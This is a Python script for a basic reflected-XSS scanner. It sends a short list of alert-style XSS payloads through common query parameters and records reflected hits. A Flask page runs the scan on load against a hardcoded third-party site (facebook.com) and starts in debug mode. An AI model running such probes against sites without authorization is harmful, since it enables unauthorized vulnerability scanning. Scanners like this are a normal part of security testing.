import requests
import urllib.parse
from colorama import Fore, init
from urllib.parse import urlparse, urlunparse
from flask import Flask, render_template_string

init(autoreset=True)

# Aggressive XSS payloads
payloads = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "'><svg/onload=alert('XSS')>",
    "<img src=x onerror=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
]

# Common parameter names
param_names = ["q", "search", "query", "s", "input", "term"]

def scan_xss(target_url):
    scan_output = "🛡️ XSS Vulnerability Scanner\n"
    scan_output += "\nStarting the scan...\n"
    
    test_urls = []

    if "=" not in target_url:
        if not target_url.startswith("http"):
            target_url = "http://" + target_url

        parsed = urlparse(target_url)
        path = parsed.path or "/"

        for param in param_names:
            query = f"{param}=test"
            full_url = urlunparse((parsed.scheme, parsed.netloc, path, '', query, ''))
            test_urls.append(full_url)

        scan_output += "ℹ️ Testing with default parameters:\n"
        for u in test_urls:
            scan_output += f"  {u}\n"
    else:
        test_urls.append(target_url)

    found = False
    for test_url in test_urls:
        base = test_url.split("=")[0]
        for payload in payloads:
            encoded_payload = urllib.parse.quote(payload)
            url = base + "=" + encoded_payload
            scan_output += f"\n🔍 Testing: {url}\n"  # Display the URL being tested
            try:
                r = requests.get(url, timeout=10)
                if payload in r.text:
                    scan_output += f"⚠️ XSS Vulnerability Detected!\n"
                    scan_output += f"🟡 Payload reflected: {payload}\n"
                    with open("vulnerabilities.txt", "a") as f:
                        f.write(f"{url} | Payload: {payload}\n")
                    found = True
                    break
            except Exception as e:
                scan_output += f"🟡 Skipped: {e}\n"
                continue
        if found:
            break

    if not found:
        scan_output += "\n✅ No XSS vulnerability detected.\n"
    else:
        scan_output += "\n⚠️ XSS vulnerability detected!\n"

    return scan_output

# New wrapper function
def perform_xss_scan(url):
    result = scan_xss(url)
    return result  # Ensure it returns a string

# Flask route
app = Flask(__name__)

@app.route('/')
def index():
    website = "https://facebook.com"  # Replace with the website you are testing
    scan_modes = ["xss"]  # Modify according to your scan modes
    result = perform_xss_scan(website)
    return render_template_string("""
        <h1>Scan Results</h1>
        <p>🔎 Scan results for: {{ website }}</p>
        <pre>{{ result }}</pre>
        <a href="/">Go Back</a>
    """, website=website, result=result)

if __name__ == "__main__":
    app.run(debug=True)
